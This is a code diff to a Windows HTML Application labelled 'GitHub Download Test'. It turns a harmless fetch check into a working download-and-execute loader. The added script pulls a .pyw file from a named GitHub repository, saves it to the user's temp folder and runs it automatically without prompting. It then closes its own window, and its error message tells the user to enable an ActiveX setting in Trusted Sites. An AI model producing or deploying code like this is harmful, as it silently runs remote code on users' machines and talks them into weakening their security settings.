@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -10,32 +9,76 @@
     caption="yes"
     showintaskbar="yes"
     singleinstance="yes"
+    sysmenu="yes"
   />
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background: #111;
+      color: #eee;
+      padding: 24px;
+    }
+    #status {
+      white-space: pre-wrap;
+      overflow-wrap: anywhere;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #00ffcc;
+    }
+  </style>
 </head>
-<body style="font-family: Segoe UI, sans-serif; padding: 20px;">
-  <h3>GitHub file test</h3>
-  <p id="status">Requesting file...</p>
+<body>
+  <h3>GitHub Download Test</h3>
+  <p id="status">Initializing download...</p>
 
   <script language="JScript">
-    var url =
-      "https://raw.githubusercontent.com/USERNAME/hello-popup-test/main/hello.pyw";
+    var url = "https://raw.githubusercontent.com/rexecutors/delta.github.io/refs/heads/main/hello.pyw";
 
     try {
+      document.getElementById("status").innerText = "Connecting to repository...";
+      
       var request = new ActiveXObject("MSXML2.XMLHTTP");
       request.open("GET", url, false);
       request.send();
 
-      if (request.status === 200) {
-        document.getElementById("status").innerText =
-          "Success: GitHub returned the file (" +
-          request.responseText.length + " characters).";
-      } else {
-        document.getElementById("status").innerText =
-          "HTTP error: " + request.status;
+      if (request.status !== 200) {
+        throw new Error("HTTP failed with status code: " + request.status);
       }
+
+      document.getElementById("status").innerText = "Saving file to local temp directory...";
+
+      var shell = new ActiveXObject("WScript.Shell");
+      var fso = new ActiveXObject("Scripting.FileSystemObject");
+      var folder = shell.ExpandEnvironmentStrings("%TEMP%");
+      var path = fso.BuildPath(folder, "hello.pyw");
+
+      // Use Binary Stream to prevent character corruption
+      var stream = new ActiveXObject("ADODB.Stream");
+      stream.Type = 1; 
+      stream.Open();
+      stream.Write(request.responseBody);
+      stream.SaveToFile(path, 2); // 2 = Overwrite if exists
+      stream.Close();
+
+      if (!fso.FileExists(path)) {
+        throw new Error("Download completed, but the file could not be found on disk.");
+      }
+
+      document.getElementById("status").innerText = "Download successful!\nExecuting file...";
+
+      // Automatically run the file without prompting
+      shell.Run('"' + path + '"', 1, false);
+      
+      document.getElementById("status").innerText += "\nFile executed successfully.";
+
+      // Optional: Automatically close the HTA window after 2 seconds
+      window.setTimeout(function() { 
+        window.close(); 
+      }, 2000);
+
     } catch (e) {
-      document.getElementById("status").innerText =
-        "Request failed: " + e.message;
+      document.getElementById("status").style.color = "#ff4444";
+      document.getElementById("status").innerText = "Error: " + e.message + "\n\nMake sure ActiveX security settings (1201) are enabled in your Trusted Sites zone.";
     }
   </script>
 </body>
